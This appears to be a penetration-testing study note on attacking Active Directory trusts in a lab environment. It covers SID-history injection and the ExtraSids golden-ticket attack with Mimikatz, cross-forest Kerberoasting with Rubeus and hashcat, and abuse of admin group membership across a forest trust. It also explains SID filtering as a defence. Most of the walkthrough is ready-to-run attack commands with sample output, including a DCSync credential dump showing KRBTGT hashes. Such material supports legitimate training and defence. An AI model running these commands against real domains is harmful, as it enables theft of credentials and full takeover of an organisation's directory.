---
title: "Attacking Domain Trusts # 1: Child -> Parent Trusts"
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 👀 Attacking Domain Trusts # 1: Child -> Parent Trusts

## ExtraSids Attack - Mimikatz

The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

The attack explained in a nugshell:

- Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control.
- When logging in with this account, all of the SIDs associated with the account are added to the user's token.
- If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

### Introduction to SID History and SID Filtering
[SID Filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) prevents such abuse by verifying and blocking unauthorized or suspicious SIDs during authentication across a trust.

>**SID History** exists specifically to allow migrated users to access resources in the original domain. Enabling SID Filtering disrupts this functionality by ignoring SID history during authentication across trust boundaries. This trade-off arises because:
>
>1. **Functionality Comes with Risk:**  
    Allowing SID history in a trust scenario opens the door for **privilege escalation attacks** through SID injection.
  >  
>2. **SID History is Not Always Needed:**
  >  
>    - In many migration scenarios, users may no longer need access to the original domain once migration is complete. In such cases, the risks of allowing SID history outweigh the benefits.
>  - SID Filtering is particularly useful in inter-forest or external trust scenarios where one environment does not fully trust the security practices of the other.
>    
>3. **Balancing Security and Usability:**  
>    Organizations must evaluate their specific requirements. If SID history functionality is crucial, **SID Filtering can be disabled selectively** for specific trusts while mitigating risks through other means (e.g., enhanced monitoring or strict trust policies).


> **Why SID Filtering is Still Useful**
>
>While SID Filtering blocks the main functionality of SID history, its purpose is not to disable SID history entirely but to **control where and when SID history can be used**:
>
>- **Within the Same Forest:**  
>   SID Filtering is typically not applied to intra-forest authentication because all domains in a forest share the same schema and security boundary. SID History works seamlessly here.  
 >  Example: Users migrating between domains in the same forest (`DomainA.local` to `DomainB.local`) can use SID history without interference.
 >   
>- **Between Different Forests:**  
    Trusts between forests (or external domains) are high-risk. SID Filtering ensures that only valid SIDs from the trusted forest or domain are honored, blocking any unauthorized or injected SIDs.

### The attack

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

#### Step 1: getting the KRBTGT hash from the child domain
First, we need to obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory.

Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

```cmd-session
# Go to mimikatz.exe file in the explorer and execute as admin

lsadump::dcsync /user:$domain\$user
# Example:
# .\mimikatz.exe
# lsadump::dcsync /user:LOGISTICS\krbtgt
```

Results:

```
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 10:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

Supplemental Credentials:

SNIP

```

KRBTGT hash : `9d765b482771505cbe97411065964d5f`.

#### Step 2: getting the SID for the child domain

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

However it was also visible in the Mimikatz output above.

#### Step 3: getting the name of a target user in the child domain (does not need to exist!)

For instance, `hacker`.

#### Step 4: getting the FQDN of the child domain.

It was also visible in the Mimikatz output above: `LOGISTICS.INLANEFREIGHT.LOCAL`.


#### Step 5: getting the SID of the Enterprise Admins group of the root domain

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. 

```powershell
Get-DomainGroup -Domain $domain -Identity "$GroupName" | select distinguishedname,objectsid
# Example: 
# Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet:

```powershell
Get-ADGroup -Identity "$GroupName" -Server "$DomainServer"`
# Example: 
# Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

Results:

```
distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```


#### Step 6: The attack

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Before the attack, we can confirm no access to the file system of the DC in the parent domain:

```powershell
# List C: in the parent domain:
ls \\$parenhostname.$domain\c$
# Example: 
# ls \\academy-ea-dc01.inlanefreight.local\c$
```

Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.

```powershell
kerberos::golden /user:$madeupUserName /domain:$targetedFQDN /sid:$sidTargetedDomain /krbtgt:$NTLMhashOfKRBTGTaccountDomain  /sids:$SIDofEnterpriseAdminGroup /ptt

# Example:
# kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

Now, let's list the kerberos tickets in memory:

```powershell
klist
```

Now we can perform actions in the parent domain, such as reading a flag:

```powershell
# List C: in the parent domain:
ls \\$parenhostname.$domain\c$
# Example: 
# ls \\academy-ea-dc01.inlanefreight.local\c$

# Read the flag
cat \\$parenhostname.$domain\c$path\to\file.txt
# Example: 
# cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

## Cross-Forest Kerberoasting

 Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

### Enumerating SPNs

Enumerating Accounts for Associated SPNs Using Get-DomainUser:

```powershell
Get-DomainUser -SPN -Domain $TargetDomain | select SamAccountName
# Example:
# Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

```

Results:

```
samaccountname
--------------
krbtgt
mssqlsvc
```

There is one account with an SPN in the target domain. 

### Getting which groups is SPM member of

A quick check shows that this account is a member of the Domain Admins group in the target domain.

```powershell
Get-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof
# Example:
# Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```


### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap
# Example: 
# .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

When getting the kerberos ticket, we can crack it: 


```shell-session
hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt 
# Results: 1logistics
```


## Admin Password Re-Use & Group Membership

From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

### Using Get-DomainForeignGroupMember

For instance,  the `FREIGHTLOGISTICS.LOCAL` domain with which we have an external bidirectional forest trust.

```powershell
Get-DomainForeignGroupMember -Domain $targeteddomain
# Example:
# Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Results:
```
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL
```

If we convert the SID to name:
```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
# Results: INLANEFREIGHT\administrator
```

Meaning that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member.

### Accessing DC03 Using Enter-PSSession

```powershell
Enter-PSSession -ComputerName $hostname.$targeteddomain -Credential $ParentDomain\administrator
# Example:
# Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
# From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain

```

## SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest.

If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.
